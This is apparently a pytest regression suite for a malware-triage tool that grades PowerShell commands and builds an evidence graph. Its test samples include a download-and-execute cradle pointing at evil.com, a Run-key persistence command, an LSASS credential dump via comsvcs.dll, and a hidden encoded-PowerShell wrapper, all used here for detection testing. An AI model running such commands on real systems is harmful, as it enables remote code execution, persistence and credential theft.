"""Verdict Uplift (Phase 5.1) + Evidence Graph (Phase 5) · regression suite.

Locks in the deterministic verdict rules and the Evidence Graph shape
so the analyst gets the same 5-second answer and the same
explainability DAG for the same input, forever.
"""
from __future__ import annotations

import base64

import pytest

from v2.investigation.evidence import Evidence
from v2.investigation.graph.models import EdgeKind, NodeKind
from v2.investigation.intent.models import IntentCategory
from v2.investigation.pipeline import investigate
from v2.investigation.verdict import VerdictBand, assess_verdict


def _enc(script: str) -> str:
    b = base64.b64encode(script.encode("utf-16-le")).decode()
    return f"powershell.exe -w Hidden -EncodedCommand {b}"


# ── Verdict golden matrix ──────────────────────────────────────
VERDICT_GOLDEN = [
    (
        "download_and_run_cradle",
        'iex (New-Object Net.WebClient).DownloadString("http://evil.com/x")',
        VerdictBand.MALICIOUS,
    ),
    (
        "registry_run_persistence",
        r'New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" '
        r'-Name X -Value calc.exe',
        VerdictBand.MALICIOUS,
    ),
    (
        "lsass_dump",
        r'rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 1234 C:\Temp\lsass.dmp full',
        VerdictBand.MALICIOUS,
    ),
    (
        "runtime_dependent_only",
        '[Reflection.Assembly]::Load([Convert]::FromBase64String($enc))',
        VerdictBand.RUNTIME_DEPENDENT,
    ),
    (
        "benign_get_process",
        'Get-Process | Sort-Object CPU -Descending | Select -First 5',
        VerdictBand.BENIGN,
    ),
    (
        "benign_write_host",
        'Write-Host "hello"',
        VerdictBand.BENIGN,
    ),
]


@pytest.mark.parametrize("name, sample, expected",
                          VERDICT_GOLDEN,
                          ids=[g[0] for g in VERDICT_GOLDEN])
def test_verdict_band_matches_expected(name, sample, expected):
    r = investigate(sample)
    assert r.verdict.band == expected, (
        f"[{name}] expected verdict {expected.value}, got "
        f"{r.verdict.band.value}. Reason: {r.verdict.reason}. "
        f"Intents: {[i.category.value for i in r.intent.intents]}"
    )


@pytest.mark.parametrize("name, sample, _", VERDICT_GOLDEN,
                          ids=[g[0] for g in VERDICT_GOLDEN])
def test_verdict_reason_never_empty(name, sample, _):
    r = investigate(sample)
    assert r.verdict.reason, f"[{name}] verdict.reason must never be empty"


@pytest.mark.parametrize("name, sample, _", VERDICT_GOLDEN,
                          ids=[g[0] for g in VERDICT_GOLDEN])
def test_verdict_evidence_is_canonical(name, sample, _):
    r = investigate(sample)
    for ev in r.verdict.evidence:
        assert isinstance(ev, Evidence)
        assert ev.source and ev.rationale


def test_verdict_conservative_language_no_campaign_labels():
    """Verdict reasons MUST NOT use definitive campaign-attribution
    words like `attack campaign`, `credential theft campaign` etc.
    Analyst-directive: describe behaviour, not motive."""
    forbidden = ["campaign", "actor", "attribut", "APT", "group"]
    for _, sample, _ in VERDICT_GOLDEN:
        r = investigate(sample)
        for word in forbidden:
            assert word.lower() not in r.verdict.reason.lower(), (
                f"Verdict reason contains forbidden word `{word}`: "
                f"{r.verdict.reason!r}"
            )


def test_verdict_determinism():
    cmd = _enc('iex (New-Object Net.WebClient).DownloadString("http://x")')
    r1 = investigate(cmd)
    r2 = investigate(cmd)
    assert r1.verdict.band == r2.verdict.band
    assert r1.verdict.reason == r2.verdict.reason
    assert r1.verdict.confidence == r2.verdict.confidence


def test_verdict_empty_input_is_benign():
    r = investigate("")
    assert r.verdict.band == VerdictBand.BENIGN


def test_verdict_bypass_call_direct_only():
    """Ensure the direct verdict-assessor also handles the empty-intents case."""
    v = assess_verdict([])
    assert v.band == VerdictBand.BENIGN
    assert v.evidence == []
    assert v.top_intents == []


# ── Evidence Graph shape ───────────────────────────────────────
def test_graph_contains_input_iu_and_intent_nodes():
    """Every investigation must produce a graph with the four canonical
    node families: input, artefact_type (IU), transformation/wrapper
    (CRE/RTE if fired), and intent (when intents fire)."""
    cmd = _enc('iex (New-Object Net.WebClient).DownloadString("http://x/y")')
    r = investigate(cmd)
    kinds = {n.kind for n in r.graph.nodes}
    assert NodeKind.INPUT in kinds
    assert NodeKind.ARTEFACT_TYPE in kinds
    assert NodeKind.INTENT in kinds
    assert NodeKind.EVIDENCE in kinds


def test_graph_edges_are_only_canonical_kinds():
    r = investigate(_enc('iex (New-Object Net.WebClient).DownloadString("http://x")'))
    for e in r.graph.edges:
        assert e.kind in {EdgeKind.DERIVES_FROM, EdgeKind.PRODUCES,
                          EdgeKind.SUPPORTS}


def test_graph_every_edge_references_existing_nodes():
    """No dangling edges — src and dst must be node IDs the graph knows."""
    r = investigate(_enc('iex (New-Object Net.WebClient).DownloadString("http://x")'))
    ids = {n.id for n in r.graph.nodes}
    for e in r.graph.edges:
        assert e.src in ids, f"dangling src: {e.src}"
        assert e.dst in ids, f"dangling dst: {e.dst}"


def test_graph_intent_supported_by_evidence_nodes():
    """Every intent node MUST have at least one incoming SUPPORTS edge
    from an evidence node — otherwise the graph would let a conclusion
    stand without evidence."""
    r = investigate('iex (New-Object Net.WebClient).DownloadString("http://x/y")')
    intent_ids = [n.id for n in r.graph.nodes if n.kind == NodeKind.INTENT]
    for iid in intent_ids:
        supporting = [
            e for e in r.graph.edges
            if e.dst == iid and e.kind == EdgeKind.SUPPORTS
        ]
        assert supporting, f"intent node `{iid}` has no supporting evidence edges"


def test_graph_determinism():
    r1 = investigate(_enc('iex (New-Object Net.WebClient).DownloadString("http://x")'))
    r2 = investigate(_enc('iex (New-Object Net.WebClient).DownloadString("http://x")'))
    # Same node/edge count and same node kinds in the same order — the
    # top-level determinism hash captures the rest.
    assert [n.id for n in r1.graph.nodes] == [n.id for n in r2.graph.nodes]
    assert [(e.src, e.dst, e.kind) for e in r1.graph.edges] == \
           [(e.src, e.dst, e.kind) for e in r2.graph.edges]
